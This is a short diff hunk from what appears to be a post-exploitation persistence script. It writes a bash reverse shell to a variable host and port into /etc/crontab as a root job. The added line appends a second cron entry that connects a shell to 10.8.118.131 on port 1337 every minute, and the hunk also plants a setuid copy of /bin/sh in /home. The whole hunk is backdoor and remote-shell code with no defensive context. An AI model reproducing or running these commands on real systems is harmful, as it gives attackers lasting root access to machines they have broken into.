@@ -293,6 +293,7 @@ chmod +x /usr/lib/yo.sh
 comando="/bin/bash -c 'bash -i >& /dev/tcp/$ip_address/$port_address 0>&1'"
 echo "* * * * * root $comando" | sudo tee -a /etc/crontab > /dev/null-
 
+echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.8.118.131/1337 0>&1'\" >> /etc/crontab
 
 cp /bin/sh /home/sh && chmod u+s /home/sh
 
